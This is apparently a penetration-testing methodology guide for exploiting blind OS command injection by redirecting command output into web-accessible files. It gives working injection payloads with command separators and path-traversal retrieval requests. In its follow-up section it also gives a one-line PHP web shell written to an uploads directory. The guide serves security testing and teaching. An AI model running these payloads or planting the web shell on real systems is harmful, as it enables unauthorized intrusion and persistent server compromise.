```text
┌────────────────────────────────────────────────────────────────────────┐
│            BLIND OS COMMAND INJECTION (OUTPUT REDIRECTION)             │
└────────────────────────────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 1: Writable Directory & Web Root Discovery │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 2: Redirection Payload Injection           │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 3: Static Asset File Retrieval             │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 4: Risk Verification & Safe PoC            │
          └──────────────────────────────────────────────────┘

```

---

### Step-by-Step Methodology Flow

#### Phase 1: Writable Directory & Web Root Discovery

* **Identify Static File Handlers:** Locate endpoints that serve or fetch files dynamically from disk (e.g., product image previews `/image?filename=cat.jpg`, document downloaders, or user avatar endpoints).
* *Analogy:* Output redirection is like dropping a secret letter into a physical suggestion box (blind injection), then walking around to the public glass bulletin board (web-accessible static directory) to read what got posted.


* **Determine Absolute Web Root Path:** Identify where the web server stores static assets:
* *Common Linux Paths:* `/var/www/html/`, `/var/www/images/`, `/var/www/uploads/`, `/usr/share/nginx/html/`
* *Common Windows Paths:* `C:\inetpub\wwwroot\`, `C:\inetpub\wwwroot\uploads\`
* *Information Disclosure Sources:* Look at error messages, stack traces, path traversal behavior, or `/phpinfo.php` output to discover the exact filesystem path.



---

#### Phase 2: Redirection Payload Injection

* **Inject Shell Redirection Operators:** Use redirection operators (`>`, `>>`) to channel the standard output (`stdout`) of a system command into a file within a web-accessible directory:
* Linux: `email=test@example.com||whoami>/var/www/static/output.txt||`
* Windows: `email=test@example.com&whoami>C:\inetpub\wwwroot\static\output.txt&`


* **Combine with Command Delimiters:** Test various command chaining operators (`||`, `;`, `&&`, `%0a`, `$()`) to ensure the shell executes the appended payload.

---

#### Phase 3: Static Asset File Retrieval

* **Issue Direct GET Request:** Request the created file directly via the browser or Burp Repeater using its public web path or file retrieval parameter:
* Direct Path: `GET /static/output.txt`
* File Fetcher Handler: `GET /image?filename=output.txt`


* **Verify File Existence & Contents:**
* **HTTP 200 OK + Command Output:** The command executed, wrote to disk, and the file handler served the content. **Vulnerability Confirmed.**
* **HTTP 404 Not Found:** The directory path was incorrect, file creation failed due to lack of write permissions, or an antivirus/WAF cleaned the file.
* **HTTP 403 Forbidden:** The file was created, but directory permissions prevent the web server from reading or listing files in that location.



---

#### Phase 4: Risk Verification & Safe PoC

* **Confirm Web Server User Context:** Verify process identity and privileges (`whoami`, `id`) to demonstrate the execution boundary.
* **Cleanup Execution Artifacts:** Immediately clean up created files on disk using secondary injection (e.g., `||rm /var/www/static/output.txt||` or `&del C:\inetpub\wwwroot\static\output.txt&`) to avoid leaving sensitive operational artifacts behind.

---

### Real-World Response Matrix

| Injected Payload | Retrieval Request | Retrieval Output | Server Execution Context | Next Action Step |
| --- | --- | --- | --- | --- |
| `email=x|whoami>/var/www/html/out.txt` | `GET /out.txt` | `www-data` | **Blind RCE via Output Redirection Confirmed.** | Capture PoC, clean up created file, and report finding. |
| `email=x|whoami>/var/www/html/out.txt` | `GET /out.txt` | `404 Not Found` | File path incorrect or process lacks write permissions on web root. | Test writable directories (`/tmp/`, `/var/tmp/`) or pivot to OOB DNS exfiltration. |
| `email=x|whoami>/tmp/out.txt` | `GET /image?filename=../../../../tmp/out.txt` | `www-data` | File written to `/tmp/` and read via Path Traversal. | Document combined vulnerability chain (Command Injection + Local File Read). |
| `email=x|whoami>out.txt` | `GET /out.txt` | `403 Forbidden` | File created in working directory, but direct web reading is restricted. | Test subfolders (`/uploads/out.txt`) or alternate retrieval routes. |

---

### Critical Real-World Factors

* **Filesystem Write Permissions (DACL/POSIX Restrictions):**
* Web server processes (`www-data`, `nginx`, `IUSR`) are typically heavily restricted and often lack write permissions on the core web root (`/var/www/html/`).
* *High-Probability Targets:* Focus redirection attempts on subdirectories designed for dynamic uploads (e.g., `/uploads/`, `/static/avatars/`, `/tmp/`), as these folders are explicitly assigned write permissions.


* **Modern Ephemeral Architectures (Docker / Serverless / Kubernetes):**
* In containerized environments, the web application and background worker may run in separate containers. Writing a file in the background worker container will **not** make it visible in the web container serving static files.
* *Solution:* In microservice or containerized environments, output redirection to disk often fails across container boundaries. Pivot directly to **Out-of-Band (OOB) DNS Exfiltration** via Burp Collaborator.


* **Overwriting Critical Files (`>` vs `>>`):**
* Single redirection (`>`) overwrites existing files, while double redirection (`>>`) appends to existing files.
* *Safety Rule:* Always write to a unique, non-existent filename (e.g., `poc_test_8841.txt`). Never redirect into existing application source files (`index.php`, `.htaccess`, `web.config`), as this will corrupt the web application and cause downtime.



---

### Related Next Steps to Explore

* **Combining Command Injection with Path Traversal:** Writing command outputs to non-public directories (`/tmp/`) and reading them via File Inclusion/Path Traversal vulnerabilities.
* **Out-of-Band (OOB) Exfiltration:** Exfiltrating system output directly via DNS/HTTP requests using Burp Collaborator when local disk writing is blocked.
* **Web Shell Persistence Escalation:** Writing persistent web shells (`echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/uploads/shell.php`) when full execution environments permit disk writes.

---

> **Key Insight:** Output redirection turns a blind command injection vulnerability into an in-band output channel by leveraging public upload directories or secondary file-retrieval endpoints as a temporary staging ground for command results.
